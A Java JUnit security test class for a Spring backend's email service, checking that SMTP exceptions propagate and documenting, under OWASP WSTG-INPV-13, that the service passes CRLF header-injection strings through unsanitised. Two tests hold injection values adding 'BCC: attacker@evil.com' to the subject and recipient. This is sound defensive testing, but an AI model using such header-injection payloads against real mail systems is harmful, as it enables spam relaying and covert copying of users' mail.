package com.dietiestate25backend.security.business;

import com.dietiestate25backend.BaseIntegrationTest;
import com.dietiestate25backend.service.EmailService;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.mockito.ArgumentCaptor;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.mail.MailSendException;
import org.springframework.mail.SimpleMailMessage;
import org.springframework.mail.javamail.JavaMailSender;
import org.springframework.test.context.bean.override.mockito.MockitoBean;

import static org.junit.jupiter.api.Assertions.*;
import static org.mockito.ArgumentMatchers.any;
import static org.mockito.Mockito.*;

/**
 * EmailService Security Tests
 *
 * Verifica le proprietà di sicurezza del servizio email, in particolare:
 *
 * WSTG-ERRH-01: MailException propagation — le eccezioni SMTP non devono essere silenziate,
 *               altrimenti una notifica di account bloccato potrebbe fallire silenziosamente.
 *
 * WSTG-INPV-13: Email Header Injection — verifica che EmailService non sanitizzi CRLF nei
 *               campi oggetto e destinatario, documentando che la validazione deve avvenire
 *               a monte (nei controller o DTO) prima di invocare questo service.
 */
@DisplayName("EmailService Security Tests - WSTG-ERRH-01, WSTG-INPV-13")
class EmailServiceSecurityTests extends BaseIntegrationTest {

    @Autowired
    private EmailService emailService;

    @MockitoBean
    private JavaMailSender emailSender;

    // ============================================================================
    // OWASP WSTG-ERRH-01: MailException propagation
    // Se il server SMTP non è raggiungibile, MailSendException non deve essere
    // silenziata: il chiamante (AuthService) deve ricevere l'eccezione per poter
    // gestire il fallimento della notifica di account bloccato.
    // ============================================================================

    @Test
    @DisplayName("inviaEmail - MailSendException from SMTP must propagate to caller (WSTG-ERRH-01)")
    void testInviaEmail_MailSendException_ShouldPropagate() {
        doThrow(new MailSendException("SMTP server unreachable"))
                .when(emailSender).send(any(SimpleMailMessage.class));

        assertThrows(MailSendException.class,
                () -> emailService.inviaEmail("user@example.com", "Account Bloccato", "Body"),
                "MailSendException must propagate — silencing it would mask failed lockout notifications");
    }

    @Test
    @DisplayName("inviaEmail - unexpected RuntimeException from sender must propagate (WSTG-ERRH-01)")
    void testInviaEmail_RuntimeException_ShouldPropagate() {
        doThrow(new RuntimeException("Unexpected mail infrastructure failure"))
                .when(emailSender).send(any(SimpleMailMessage.class));

        assertThrows(RuntimeException.class,
                () -> emailService.inviaEmail("user@example.com", "Subject", "Body"),
                "Unexpected runtime errors from the mail sender must not be silently swallowed");
    }

    // ============================================================================
    // OWASP WSTG-INPV-13: Email Header Injection via CRLF
    // EmailService non esegue sanitizzazione dei campi. I test seguenti documentano
    // che CRLF nel campo 'oggetto' e 'destinatario' vengono inoltrati a JavaMailSender
    // senza modifiche. La validazione DEVE essere applicata nel controller o nel DTO
    // (@Email, @Pattern) prima che la stringa raggiunga questo service.
    // ============================================================================

    @Test
    @DisplayName("inviaEmail - CRLF in oggetto is forwarded to sender unmodified (WSTG-INPV-13)")
    void testInviaEmail_CrlfInOggetto_IsForwardedUnmodified() {
        ArgumentCaptor<SimpleMailMessage> captor = ArgumentCaptor.forClass(SimpleMailMessage.class);
        String injectedSubject = "Account Bloccato\r\nBCC: attacker@evil.com";

        emailService.inviaEmail("user@example.com", injectedSubject, "Body");

        verify(emailSender).send(captor.capture());
        assertEquals(injectedSubject, captor.getValue().getSubject(),
                "EmailService does not sanitize CRLF in subject — header injection validation must be enforced upstream");
    }

    @Test
    @DisplayName("inviaEmail - CRLF in destinatario is forwarded to sender unmodified (WSTG-INPV-13)")
    void testInviaEmail_CrlfInDestinatario_IsForwardedUnmodified() {
        ArgumentCaptor<SimpleMailMessage> captor = ArgumentCaptor.forClass(SimpleMailMessage.class);
        String injectedRecipient = "victim@example.com\r\nBCC: attacker@evil.com";

        emailService.inviaEmail(injectedRecipient, "Subject", "Body");

        verify(emailSender).send(captor.capture());
        String[] recipients = captor.getValue().getTo();
        assertNotNull(recipients, "Recipients must not be null");
        assertEquals(injectedRecipient, recipients[0],
                "EmailService does not sanitize CRLF in recipient — header injection validation must be enforced upstream");
    }

    @Test
    @DisplayName("inviaEmail - valid inputs are correctly forwarded to JavaMailSender (positive control)")
    void testInviaEmail_ValidInputs_ShouldBeForwardedCorrectly() {
        ArgumentCaptor<SimpleMailMessage> captor = ArgumentCaptor.forClass(SimpleMailMessage.class);

        emailService.inviaEmail("user@example.com", "Account Bloccato", "Il tuo account è bloccato");

        verify(emailSender).send(captor.capture());
        SimpleMailMessage sent = captor.getValue();
        assertNotNull(sent.getTo());
        assertEquals("user@example.com", sent.getTo()[0]);
        assertEquals("Account Bloccato", sent.getSubject());
        assertEquals("Il tuo account è bloccato", sent.getText());
    }
}